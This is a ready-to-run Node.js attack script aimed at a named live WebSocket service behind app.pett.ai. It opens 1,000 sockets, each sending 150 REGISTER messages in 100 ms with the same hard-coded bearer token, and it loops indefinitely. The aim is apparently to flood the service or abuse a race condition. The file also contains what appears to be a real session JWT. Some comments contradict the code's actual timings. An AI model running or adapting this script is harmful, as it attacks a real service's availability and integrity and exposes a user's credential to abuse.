import WebSocket from "ws";
import { v4 as uuidv4 } from "uuid";

const endpoint = "wss://petbot-monorepo-websocket-333713154917.europe-west1.run.app/";
const origin = "https://app.pett.ai";
const pettName = `ao_${Math.floor(Math.random() * 999)}_rrr_${Math.floor(Math.random() * 9999)}`;

// Your valid pptoken
const jwt = "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlU3bU9NMzBNZGJRY3RQMmdoWE4wU0dhTDFIWjNSUWVoZWxkZUNHNF9OaWsifQ.eyJzaWQiOiJjbWY5enRxODUwMTVmbDUwYmxiZmJ2MTV0IiwiaXNzIjoicHJpdnkuaW8iLCJpYXQiOjE3NTcyNjc3MTQsImF1ZCI6ImNtN2dldjVzNjAwdmJrMmxzajZlMWU5ZzciLCJzdWIiOiJkaWQ6cHJpdnk6Y21mOXp0cTl5MDE1aGw1MGI0cXhibXZnNCIsImV4cCI6MTc1NzI3MTMxNH0.BbRA4svEPJMESgK17oyfeDEEVYlbOBFY2Gxlb9wU27g1jcjtlWBcc4tMSJ8aSrRVeN-BzJ-mP1-SPvg0HbLf9A"; // shortened for clarity

const TOTAL_SOCKETS = 1000;
const REQUESTS_PER_SOCKET = 150;
const BLAST_DURATION_MS = 100; // 1 second blast

function makeRegisterMessage() {
  return {
    type: "REGISTER",
    data: {
      params: {
        authType: "privy",
        registerHash: {
          hash: jwt,
          name: pettName,
        },
      },
    },
    nonce: uuidv4(),
  };
}

function blastRegister(ws, count, durationMs, onComplete) {
  const interval = durationMs / count; // interval between sends
  let sent = 0;

  const intervalId = setInterval(() => {
    if (sent >= count) {
      clearInterval(intervalId);
      console.log("🚀 Finished sending ${count} REGISTER requests on one socket");
      onComplete();
      return;
    }
    try {
      ws.send(JSON.stringify(makeRegisterMessage()));
    } catch (e) {
      console.error("⚠ Send failed:", e.message);
    }
    sent++;
  }, interval);
}

function connectSocket(onBlastComplete) {
  const headers = {
    Origin: origin,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
  };

  const ws = new WebSocket(endpoint, { headers });

  ws.on("open", () => {
    console.log("✅ Socket connected, waiting 5s before blasting...");
    setTimeout(() => {
      blastRegister(ws, REQUESTS_PER_SOCKET, BLAST_DURATION_MS, () => {
        ws.close();
        onBlastComplete();
      });
    }, 0.01);
  });

  ws.on("error", (err) => {
    console.error("❌ WebSocket Error:", err.message);
  });

  ws.on("close", () => {
    console.log("🔒 Socket closed");
  });
}

function startBlastCycle() {
  console.log("🔄 Starting blast with ${TOTAL_SOCKETS} sockets...");

  let completed = 0;

  for (let i = 0; i < TOTAL_SOCKETS; i++) {
    connectSocket(() => {
      completed++;
      if (completed === TOTAL_SOCKETS) {
        console.log("✅ All sockets finished blasting. Reconnecting in 3s...");
        setTimeout(startBlastCycle, 80000);
      }
    });
  }
}

// Start the cycle
startBlastCycle();